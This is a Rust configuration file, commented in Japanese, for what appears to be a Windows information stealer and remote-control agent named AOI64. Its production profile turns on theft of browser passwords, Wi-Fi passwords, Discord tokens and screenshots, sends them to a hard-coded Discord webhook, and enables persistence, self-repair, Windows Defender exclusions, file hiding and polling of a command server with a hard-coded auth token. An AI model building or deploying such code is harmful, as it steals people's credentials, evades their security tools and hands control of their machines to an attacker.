use serde::{Deserialize, Serialize};

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct Config {
    // Basic
    pub timeout_seconds: u64,

    // Webhook
    pub webhook_url: String,
    pub webhook_type: String,
    pub webhook_enabled: bool,

    // Collection flags (only used ones)
    pub collect_screenshots: bool,
    pub collect_browser_passwords: bool,
    pub collect_wifi_passwords: bool,
    pub collect_discord_tokens: bool,

    // === 永続化・ステルス機能制御フラグ ===
    // 注意: これらの機能は本番環境でのみ使用することを推奨
    pub enable_persistence: bool,              // レジストリ・タスクスケジューラーによる永続化
    pub enable_stealth_mode: bool,             // ステルス機能の全体制御（以下の個別機能を含む）
    pub enable_persistence_repair: bool,       // 永続化設定の自己修復機能（5分間隔）
    pub enable_defender_exclusion: bool,       // Windows Defender除外リスト追加（要管理者権限）
    pub enable_file_hiding: bool,              // 実行ファイルを隠しファイル属性に設定
    pub enable_process_priority_adjustment: bool, // プロセス優先度を下げて目立たなくする

    // HTTPサーバー通信設定
    pub command_server_url: String,         // コマンドサーバーのURL
    pub command_server_enabled: bool,       // HTTPサーバー通信の有効/無効
    pub command_auth_token: String,         // サーバー認証トークン
    pub command_poll_interval_seconds: u64, // サーバーポーリング間隔（命令確認）
    pub heartbeat_interval_seconds: u64,    // ハートビート送信間隔

    // 暗号鍵の取得方法（クライアントは公開鍵のみ使用）
    // 優先順: `public_key_pem` -> 環境変数 AOI64_PUBLIC_KEY_PEM -> ファイル("public_key.pem")
    #[serde(skip_serializing_if = "Option::is_none")]
    pub public_key_pem: Option<String>,
}

impl Default for Config {
    fn default() -> Self {
        Config {
            timeout_seconds: 45,
            webhook_url: "".to_string(),
            webhook_type: "Discord".to_string(),
            webhook_enabled: true,
            collect_screenshots: true,
            collect_browser_passwords: true,
            collect_wifi_passwords: true,
            collect_discord_tokens: true,

            enable_persistence: true,              // 本番環境では true に変更
            enable_stealth_mode: true,             // 本番環境では true に変更
            enable_persistence_repair: true,      // 本番環境では true に変更
            enable_defender_exclusion: true,      // 管理者権限必要
            enable_file_hiding: true,             // 本番環境では true に変更
            enable_process_priority_adjustment: true, // 常に有効（害なし）
            
            // HTTPサーバー通信設定
            command_server_url: "http://127.0.0.1:8080".to_string(),
            command_server_enabled: true,
            command_auth_token: "".to_string(),
            command_poll_interval_seconds: 10,
            heartbeat_interval_seconds: 30,

            // 既定では埋め込まない（必要なら環境変数/ファイルを利用）
            public_key_pem: None,
        }
    }
}

pub fn load_config_or_default() -> Config {
    // 環境変数で設定プロファイルを切り替え
    match std::env::var("AOI64_PROFILE").as_deref() {
        Ok("production") => load_production_config(),
        Ok("development") => load_development_config(),
        _ => Config::default(),
    }
}

/// 本番環境用の設定を取得
pub fn load_production_config() -> Config {
    Config {
        timeout_seconds: 45,
        webhook_url: "https://discord.com/api/webhooks/1418989059262386238/KI35x38t0aw6yiMsM9h1_k1ypJQXg_aBK8JaYziXyto9XlnrSGydc1qkmnDf1tbNDVA9".to_string(),
        webhook_type: "Discord".to_string(),
        webhook_enabled: true,
        collect_screenshots: true,
        collect_browser_passwords: true,
        collect_wifi_passwords: true,
        collect_discord_tokens: true,

        // 本番環境では全ての隠蔽・永続化機能を有効化
        enable_persistence: true,
        enable_stealth_mode: true,
        enable_persistence_repair: true,
        enable_defender_exclusion: true,  // 管理者権限がない場合はスキップ
        enable_file_hiding: true,
        enable_process_priority_adjustment: true,
        
        command_server_url: "http://127.0.0.1:8080".to_string(),
        command_server_enabled: true,
        command_auth_token: "ZajmPAB9o8C5UgATU23mnGdBcun30IuILDaP8efMWRYtSlvT89".to_string(),
        command_poll_interval_seconds: 10,
        heartbeat_interval_seconds: 30,
        public_key_pem: None,
    }
}

/// 開発環境用の安全な設定を取得
pub fn load_development_config() -> Config {
    Config {
        timeout_seconds: 45,
        webhook_url: String::new(), // 開発環境では無効
        webhook_type: "Discord".to_string(),
        webhook_enabled: false,     // 開発環境では無効
        collect_screenshots: false, // 開発環境では最小限
        collect_browser_passwords: false,
        collect_wifi_passwords: false,
        collect_discord_tokens: false,

        // 開発環境では全ての危険な機能を無効化
        enable_persistence: false,
        enable_stealth_mode: false,
        enable_persistence_repair: false,
        enable_defender_exclusion: false,
        enable_file_hiding: false,
        enable_process_priority_adjustment: false,
        
        command_server_url: "http://127.0.0.1:8080".to_string(),
        command_server_enabled: false, // 開発環境では無効
        command_auth_token: "dev_token_safe".to_string(),
        command_poll_interval_seconds: 60,
        heartbeat_interval_seconds: 120,
        public_key_pem: None,
    }
}

pub fn validate_config(config: &Config) -> Result<(), String> {
    if config.timeout_seconds == 0 {
        return Err("Timeout must be greater than 0".to_string());
    }
    if config.webhook_enabled && config.webhook_url.trim().is_empty() {
        return Err("Webhook is enabled but URL is empty".to_string());
    }

    // HTTPサーバー通信の検証
    if config.command_server_enabled {
        if config.command_server_url.trim().is_empty() {
            return Err(
                "Command server URL cannot be empty when server communication is enabled"
                    .to_string(),
            );
        }
        if !config.command_server_url.starts_with("http://")
            && !config.command_server_url.starts_with("https://")
        {
            return Err("Command server URL must start with http:// or https://".to_string());
        }
        if config.command_auth_token.trim().is_empty() {
            return Err(
                "Auth token cannot be empty when server communication is enabled".to_string(),
            );
        }
        if config.command_auth_token.len() < 16 {
            return Err("Auth token must be at least 16 characters long".to_string());
        }
        if config.command_poll_interval_seconds < 1 {
            return Err("Poll interval should be at least 1 second".to_string());
        }
        if config.heartbeat_interval_seconds < 1 {
            return Err("Heartbeat interval should be at least 1 second".to_string());
        }
    }

    // 永続化・ステルス機能の警告
    if config.enable_persistence && !cfg!(windows) {
        return Err("Persistence features are only available on Windows".to_string());
    }
    
    if config.enable_stealth_mode && !cfg!(windows) {
        return Err("Stealth mode features are only available on Windows".to_string());
    }

    Ok(())
}
